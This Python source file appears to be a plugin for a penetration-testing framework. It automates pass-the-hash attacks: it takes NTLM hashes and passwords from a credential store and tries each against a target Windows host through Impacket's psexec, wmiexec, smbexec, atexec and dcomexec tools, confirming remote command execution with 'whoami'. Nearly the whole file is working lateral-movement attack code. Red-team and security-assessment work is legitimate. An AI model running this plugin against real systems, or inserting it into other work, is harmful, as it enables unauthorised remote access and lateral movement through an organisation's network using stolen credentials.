"""Pass-the-Hash — authenticate via NTLM hash through SMB/WMI/DCOM."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# Execution methods for PTH
PTH_METHODS = [
    {
        "name": "psexec",
        "tool": "psexec.py",
        "description": "Upload service binary → execute as SYSTEM",
        "noisy": True,
    },
    {
        "name": "wmiexec",
        "tool": "wmiexec.py",
        "description": "WMI semi-interactive shell (no binary upload)",
        "noisy": False,
    },
    {
        "name": "smbexec",
        "tool": "smbexec.py",
        "description": "SMB service execution (creates service)",
        "noisy": True,
    },
    {
        "name": "atexec",
        "tool": "atexec.py",
        "description": "Task Scheduler execution (single command)",
        "noisy": False,
    },
    {
        "name": "dcomexec",
        "tool": "dcomexec.py",
        "description": "DCOM execution (MMC20, ShellWindows, ShellBrowserWindow)",
        "noisy": False,
    },
]


class PassTheHashPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="pass_the_hash",
        display_name="Pass-the-Hash",
        category=PluginCategory.LATERAL,
        description="Authenticate via NTLM hash through SMB/WMI/DCOM",
        produces=["shell_session", "lateral_access"],
        timeout=60.0,
        requires_http=False,
        requires_credentials=True,
        risk_level="noisy",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"successful_methods": [], "tested_creds": []}

        if not ctx.creds:
            return PluginResult.fail(
                self.meta.name, target.host, error="No credential store",
            )

        # Get NTLM hashes from credential store
        ntlm_creds = ctx.creds.get_by_type("ntlm_hash")
        password_creds = ctx.creds.get_for_target(target.host)

        all_creds = ntlm_creds + [
            c for c in password_creds if c.secret_type == "password"
        ]

        if not all_creds:
            findings.append(Finding.info(
                "No NTLM hashes or passwords available for PTH",
                tags=["lateral", "pth"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        domain = target.meta.get("ad_domain", "")

        # Try each credential with each method
        for cred in all_creds[:5]:
            if ctx.should_stop:
                break
            data["tested_creds"].append({
                "username": cred.username,
                "type": cred.secret_type,
            })

            for method in PTH_METHODS:
                if ctx.should_stop:
                    break

                if not ctx.subprocess_mgr:
                    continue

                avail = await ctx.subprocess_mgr.is_available(method["tool"])
                if not avail:
                    continue

                if cred.secret_type == "ntlm_hash":
                    auth = f"-hashes :{cred.secret}"
                else:
                    auth = f"'{cred.secret}'"

                domain_prefix = f"{domain}/" if domain else ""
                cmd = (
                    f"{method['tool']} "
                    f"{domain_prefix}{cred.username}@{target.host} "
                    f"{auth} whoami"
                )
                result = await ctx.subprocess_mgr.run(cmd, timeout=15)

                if result.returncode == 0 and result.stdout:
                    output = result.stdout.strip()
                    if "nt authority" in output.lower() or cred.username.lower() in output.lower():
                        data["successful_methods"].append({
                            "method": method["name"],
                            "username": cred.username,
                            "output": output[:200],
                        })
                        findings.append(Finding.critical(
                            f"PTH success: {method['name']} as {cred.username}",
                            evidence=f"Method: {method['name']}\nOutput: {output[:300]}",
                            description=method["description"],
                            tags=["lateral", "pth", method["name"]],
                        ))
                        break  # Found working method for this cred

        if not data["successful_methods"]:
            findings.append(Finding.info(
                f"PTH failed for {len(all_creds)} credentials",
                tags=["lateral", "pth"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
